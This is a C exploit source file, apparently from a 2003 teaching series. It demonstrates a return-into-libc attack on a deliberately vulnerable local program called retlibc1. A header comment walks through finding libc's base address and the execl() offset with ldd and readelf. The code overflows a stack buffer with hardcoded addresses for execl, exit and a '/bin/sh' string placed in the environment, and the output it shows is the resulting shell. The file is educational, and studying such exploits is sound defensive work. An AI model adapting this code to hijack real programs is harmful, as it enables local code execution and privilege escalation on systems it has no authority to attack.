/*
 * $Id: retlibc1-ex3.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * retlibc1-ex3.c - retlibc1.c exploit (return-into-libc)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This exploit shows the basic return-into-libc technique, changing the 
 * execution flow of an abo1.c-like vulnerable program. This time we use
 * the execl() function, with another (more elegant) hack to pass the 
 * correct parameters.
 *
 * Tested on Linux 2.4.20-rc4 with gcc-2.95.4. For newer compilers, you          * probably have to use a bigger buffer and pad A's to (67 * 4) = 268.
 *
 * First, grab the base memory address where libc are mapped:
 * $ ldd retlibc1
 * 	libc.so.6 => /lib/libc.so.6 (0x4001a000)
 *                                   ^^^^^^^^^^\__(LIBBASE address)
 * 	[...]
 *
 * Then, grab the execl() offset in libc as follows:
 * $ readelf -a /lib/libc.so.6 | grep " execl@"
 *    441: 000a1060   181 FUNC    GLOBAL DEFAULT   11 execl@@GLIBC_2.0
 *         ^^^^^^^^\__(this is the execl() offset in libc)
 *
 * $ ./retlibc1-ex3
 * Using execl() address: 0x400bb060
 * Using /bin/sh address: 0xbfffffe9
 * sh-2.05a$ 
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF	281			// (65 * 4) + (5 * 4) + 1
#define LIBBASE	0x4001a000		// base address of libc mapping
#define EXECL	(LIBBASE + 0x000a1060)	// execl() address in libc
#define EXIT	(LIBBASE + 0x0002bdc0)	// exit() address in libc
#define	SHELL	"/bin/sh"		// the "/bin/sh" string
#define PARAMS	"--"			// another hack for execl()

int main()
{
	char *env[3] = {PARAMS, SHELL, NULL};
	char buf[BUF];

	int *p = (int *)buf;
	int shell = 0xbffffffa - strlen(SHELL) - strlen("./retlibc1");
	int params = shell - strlen(PARAMS) - 1;

	fprintf(stderr, "Using execl() address: %p\n", EXECL);
	fprintf(stderr, "Using /bin/sh address: %p\n", shell);

	/* fill the first part of the buffer */
	memset(buf, 'A', BUF);
	p += 65;

	/* prepare the stack */
	*p++ = EXECL;		/* execl() address in libc */
	*p++ = EXIT;		/* exit() address in libc (dummy) */
	*p++ = shell;		/* "/bin/sh" address in env */
	*p++ = shell + 5;	/* "sh" address in env */
	*p++ = params;		/* "--" address in env */
	*p = 0x0;

	/* run the vulnerable program */
	execle("./retlibc1", "retlibc1", buf, NULL, env);
	perror("execle");
}
